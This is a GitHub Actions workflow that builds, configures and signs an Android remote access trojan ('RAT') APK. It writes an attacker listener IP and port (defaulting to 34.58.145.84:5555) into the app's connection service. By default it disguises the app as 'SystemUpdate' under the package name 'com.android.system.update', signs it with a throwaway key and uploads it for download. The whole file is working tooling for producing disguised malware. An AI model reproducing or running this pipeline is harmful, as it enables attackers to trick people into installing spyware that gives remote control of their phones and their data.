name: Build RAT APK

on:
  workflow_dispatch:
    inputs:
      lhost:
        description: 'Listener IP Address'
        required: true
        default: '34.58.145.84'
      lport:
        description: 'Listener Port'
        required: true
        default: '5555'
      app_name:
        description: 'Application Name'
        required: true
        default: 'SystemUpdate'
      package_name:
        description: 'Package Name (e.g., com.android.update)'
        required: true
        default: 'com.android.system.update'
      icon_data:
        description: 'Base64 encoded icon data'
        required: false
        default: ''

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
    - name: Checkout repository
      uses: actions/checkout@v4

    - name: Set up JDK 17
      uses: actions/setup-java@v4
      with:
        java-version: '17'
        distribution: 'temurin'

    - name: Setup Android SDK
      run: |
        wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
        unzip commandlinetools-linux-9477386_latest.zip
        mkdir -p $ANDROID_HOME/cmdline-tools
        mv cmdline-tools $ANDROID_HOME/cmdline-tools/latest
        export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin
        yes | sdkmanager --licenses
        sdkmanager "platform-tools" "platforms;android-33" "build-tools;33.0.0"

    - name: Process Custom Icon with Node.js
      if: ${{ github.event.inputs.icon_data != '' }}
      run: |
        echo "Processing custom icon with Node.js..."
        
        # Create mipmap directories
        mkdir -p app/src/main/res/mipmap-hdpi
        mkdir -p app/src/main/res/mipmap-mdpi
        mkdir -p app/src/main/res/mipmap-xhdpi
        mkdir -p app/src/main/res/mipmap-xxhdpi
        mkdir -p app/src/main/res/mipmap-xxxhdpi
        
        # Extract base64 data
        ICON_DATA="${{ github.event.inputs.icon_data }}"
        if [[ $ICON_DATA == data:* ]]; then
          ICON_DATA=$(echo $ICON_DATA | sed 's/^data:image\/[^;]*;base64,//')
        fi
        
        # Create Node.js script to process image
        cat > process-icon.js << 'EOF'
        const fs = require('fs');
        const sharp = require('sharp');
        
        const base64Data = process.argv[2];
        if (!base64Data) {
          console.error('No icon data provided');
          process.exit(1);
        }
        
        const sizes = [
          { size: 48, path: 'app/src/main/res/mipmap-hdpi/ic_launcher.png' },
          { size: 32, path: 'app/src/main/res/mipmap-mdpi/ic_launcher.png' },
          { size: 64, path: 'app/src/main/res/mipmap-xhdpi/ic_launcher.png' },
          { size: 96, path: 'app/src/main/res/mipmap-xxhdpi/ic_launcher.png' },
          { size: 128, path: 'app/src/main/res/mipmap-xxxhdpi/ic_launcher.png' }
        ];
        
        try {
          const imageBuffer = Buffer.from(base64Data, 'base64');
          
          async function processImages() {
            for (const { size, path } of sizes) {
              await sharp(imageBuffer)
                .resize(size, size, { fit: 'cover' })
                .png()
                .toFile(path);
              console.log(`✅ Created ${path} (${size}x${size})`);
            }
            console.log('✅ All icon sizes generated successfully');
          }
          
          processImages().catch(error => {
            console.error('Error processing images:', error);
            process.exit(1);
          });
        } catch (error) {
          console.error('Error decoding base64:', error);
          process.exit(1);
        }
        EOF
        
        # Install sharp
        echo "Installing sharp package..."
        npm install sharp --silent
        
        # Run the script
        echo "Generating icon sizes..."
        node process-icon.js "$ICON_DATA"
        
        echo "✅ Custom icon processed successfully"

    - name: Create Default Icons (if no custom icon)
      if: ${{ github.event.inputs.icon_data == '' }}
      run: |
        echo "No custom icon provided, creating default icons..."
        
        # Create mipmap directories
        mkdir -p app/src/main/res/mipmap-hdpi
        mkdir -p app/src/main/res/mipmap-mdpi
        mkdir -p app/src/main/res/mipmap-xhdpi
        mkdir -p app/src/main/res/mipmap-xxhdpi
        mkdir -p app/src/main/res/mipmap-xxxhdpi
        
        # Create Node.js script to generate colored icons
        cat > generate-default-icons.js << 'EOF'
        const fs = require('fs');
        const sharp = require('sharp');
        
        const sizes = [
          { size: 48, path: 'app/src/main/res/mipmap-hdpi/ic_launcher.png' },
          { size: 32, path: 'app/src/main/res/mipmap-mdpi/ic_launcher.png' },
          { size: 64, path: 'app/src/main/res/mipmap-xhdpi/ic_launcher.png' },
          { size: 96, path: 'app/src/main/res/mipmap-xxhdpi/ic_launcher.png' },
          { size: 128, path: 'app/src/main/res/mipmap-xxxhdpi/ic_launcher.png' }
        ];
        
        // Create a simple blue square with "RAT" text
        async function generateDefaultIcon(size, outputPath) {
          const svgImage = `
          <svg width="${size}" height="${size}" viewBox="0 0 ${size} ${size}" xmlns="http://www.w3.org/2000/svg">
            <rect width="${size}" height="${size}" fill="#2196F3" rx="${size/8}" ry="${size/8}"/>
            <text x="50%" y="50%" font-family="Arial" font-size="${size/3}" 
                  fill="white" text-anchor="middle" dy=".3em" font-weight="bold">RAT</text>
          </svg>`;
          
          await sharp(Buffer.from(svgImage))
            .png()
            .toFile(outputPath);
          console.log(`✅ Created ${outputPath} (${size}x${size})`);
        }
        
        async function generateAll() {
          for (const { size, path } of sizes) {
            await generateDefaultIcon(size, path);
          }
          console.log('✅ All default icons generated successfully');
        }
        
        generateAll().catch(console.error);
        EOF
        
        # Install sharp
        echo "Installing sharp package..."
        npm install sharp --silent
        
        # Generate default icons
        echo "Generating default icon sizes..."
        node generate-default-icons.js
        
        echo "✅ Default icons created successfully"

    - name: Update Configuration with Listener Details
      run: |
        # Update ConnectionService.java with LHOST and LPORT
        if [ -f app/src/main/java/com/fly0rakoon/rat/services/ConnectionService.java ]; then
          sed -i "s/private static String SERVER_IP = \".*\";/private static String SERVER_IP = \"${{ github.event.inputs.lhost }}\";/" app/src/main/java/com/fly0rakoon/rat/services/ConnectionService.java
          sed -i "s/private static int SERVER_PORT = .*;/private static int SERVER_PORT = ${{ github.event.inputs.lport }};/" app/src/main/java/com/fly0rakoon/rat/services/ConnectionService.java
        fi
        
        # Update app name in strings.xml if it exists
        if [ -f app/src/main/res/values/strings.xml ]; then
          sed -i "s/<string name=\"app_name\">.*<\/string>/<string name=\"app_name\">${{ github.event.inputs.app_name }}<\/string>/" app/src/main/res/values/strings.xml
        fi
        
        # Remove package attribute from AndroidManifest.xml if it exists
        if [ -f app/src/main/AndroidManifest.xml ]; then
          sed -i 's/package="[^"]*"//' app/src/main/AndroidManifest.xml
        fi
        
        # Update build.gradle with package name and namespace
        if [ -f app/build.gradle ]; then
          sed -i "s/applicationId \".*\"/applicationId \"${{ github.event.inputs.package_name }}\"/" app/build.gradle
          sed -i "s/namespace \".*\"/namespace \"${{ github.event.inputs.package_name }}\"/" app/build.gradle
        fi

    - name: Build APK
      run: |
        chmod +x gradlew
        ./gradlew assembleRelease --no-daemon

    - name: Sign APK Properly
      run: |
        # Generate keystore for signing
        echo "🔑 Generating keystore..."
        keytool -genkey -v -keystore release.keystore -alias ratkey -keyalg RSA -keysize 2048 -validity 10000 -storepass 123456 -keypass 123456 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown"
        
        # Define paths
        UNSIGNED_APK="app/build/outputs/apk/release/app-release-unsigned.apk"
        ALIGNED_APK="app/build/outputs/apk/release/app-release-aligned.apk"
        SIGNED_APK="${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk"
        
        # Check if unsigned APK exists
        if [ ! -f "$UNSIGNED_APK" ]; then
          echo "❌ Unsigned APK not found at $UNSIGNED_APK"
          exit 1
        fi
        
        echo "📦 Found unsigned APK: $(ls -lh $UNSIGNED_APK)"
        
        # Step 1: Zipalign the APK
        echo "🔧 Aligning APK with zipalign..."
        $ANDROID_HOME/build-tools/33.0.0/zipalign -v -p 4 "$UNSIGNED_APK" "$ALIGNED_APK"
        
        # Step 2: Sign the aligned APK
        echo "✍️ Signing APK with apksigner..."
        $ANDROID_HOME/build-tools/33.0.0/apksigner sign \
          --ks release.keystore \
          --ks-pass pass:123456 \
          --key-pass pass:123456 \
          --out "$SIGNED_APK" \
          "$ALIGNED_APK"
        
        # Step 3: Verify the signature
        echo "✅ Verifying APK signature..."
        $ANDROID_HOME/build-tools/33.0.0/apksigner verify --verbose "$SIGNED_APK"
        
        # Step 4: Check if signed APK was created
        if [ -f "$SIGNED_APK" ]; then
          echo "✅ Signed APK created successfully: $SIGNED_APK"
          echo "📊 Signed APK size: $(ls -lh $SIGNED_APK | awk '{print $5}')"
        else
          echo "❌ Failed to create signed APK"
          exit 1
        fi

    - name: Upload APK Artifact
      uses: actions/upload-artifact@v4
      with:
        name: rat-apk
        path: ${{ github.event.inputs.app_name }}_${{ github.event.inputs.lhost }}.apk
        retention-days: 1
        if-no-files-found: error
